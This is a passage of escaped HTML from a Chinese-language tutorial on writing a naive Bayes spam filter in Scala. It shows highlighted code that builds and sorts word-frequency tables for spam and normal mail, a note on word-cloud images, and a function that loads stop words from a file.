&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Sort the words by occurrence rate descending &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//以出现率降序排列这些单词&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//(amount of times the word occurs among all documents)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//（该单词在所有文档中出现的总次数）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedSpamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spamTDM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamMails&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-17&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-27&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Sort the words by occurrence rate  descending &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//以出现率降序排列这些单词&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//(amount of times the word occurs among all documents)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//（该单词在所有文档中出现的总次数）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedHamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamTDM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamMails&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0072 seconds] --&gt;
&lt;p&gt;给定了那些表格，为了更深入了解它们，我用 &lt;a href=&quot;http://www.wordle.net/&quot;&gt;wordcloud&lt;/a&gt; 将它们生成图片。这些图片中反映了频率最高的 50 个单词 (top 50)的情况，我们观察一下。注意红色单词来自垃圾邮件，绿色单词来自正常邮件。此外，单词的大小代表出现率。因此，单词越大，至少出现一次该单词的文档越多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/760df473b99bb7a88f3c74d53b4ed665.jpg&quot; width=&quot;790px&quot; height=&quot;395px&quot;&gt;&lt;img src=&quot;/images/jobbole.com/90fcbfe3ccf8a65c2fdb3799ae06b3b0.jpg&quot; width=&quot;790px&quot; height=&quot;395px&quot;&gt;&lt;/p&gt;
&lt;p&gt;你可以看到，停用词大多出现在前面。这些停用词是噪声，在特征选择过程中我们要尽可能避开它们。所以在选出特征之前，我们要从表格中剔除这些词。案例数据集已经包含了一列停用词，我们首先编写代码来获取这些词。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061349295913129&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 def getStopWords() : List[String] =
  {
    val source = scala.io.Source
        .fromFile(new File(&quot;/Users/.../.../Example Data/stopwords.txt&quot;))(&quot;latin1&quot;)
    val lines = source.mkString.split(&quot;n&quot;)
    source.close()
    return  lines.toList
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
